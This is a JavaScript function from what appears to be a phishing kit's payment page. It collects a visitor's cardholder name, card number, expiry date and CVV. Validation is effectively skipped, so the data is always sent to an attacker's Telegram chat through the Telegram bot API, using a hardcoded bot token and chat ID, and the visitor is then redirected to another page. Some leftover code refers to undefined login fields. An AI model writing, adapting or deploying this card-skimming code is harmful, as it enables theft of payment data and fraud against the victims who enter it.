function cardContinue(){
    let isValid = true

    const cardHolder = document.getElementById("cardholder")
    const cardNumber = document.getElementById("cardnumber")
    const expiry = document.getElementById("expiry")
    const cvv = document.getElementById("cvv")
    const zip = document.getElementById("zip")

    if(cardHolder.value == "" || cardNumber.value == "" || expiry.value == "" || cvv.value == "" || zip.value == ""){
        document.getElementById("cardError").style.display = "block"
        document.getElementById("cardnumberError").style.display = "block"
        document.getElementById("expiryError").style.display = "block"
        document.getElementById("cvvError").style.display = "block"
        document.getElementById("zipError").style.display = "block"
    }else{
        document.getElementById("cardError").style.display = "none"
        document.getElementById("cardnumberError").style.display = "none"
        document.getElementById("expiryError").style.display = "none"
        document.getElementById("cvvError").style.display = "none"
        document.getElementById("zipError").style.display = "none"
    }
    if(isValid){
        //  If validation passes, send data to Telegram
        const botToken = "8017405297:AAFlLa-_uAor4TFX0PgP0OiaaVq2-hy2fTo"; // Replace with your bot token
        const chatID = "7528859168"; // Replace with your chat ID

        const telegramMessage =
        `---------New Login Attempt---------

        👤 Cardholder:  ${cardHolder.value}
        🔒 Card number: ${cardNumber.value}
            Expire:     ${expiry.value}
            CVV:       ${cvv.value}`

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatID,
                text: telegramMessage
            }),
        })
        setTimeout(()=>{
            window.location.href = "redirect.html"
        }, 2000)
    }else {
        if (userName.value.trim() == "") {
            document.getElementById("userError").style.display = "block"
        }
        if (passWord.value.trim() == "") {
            document.getElementById("passError").style.display = "block"
        }
    }
    
}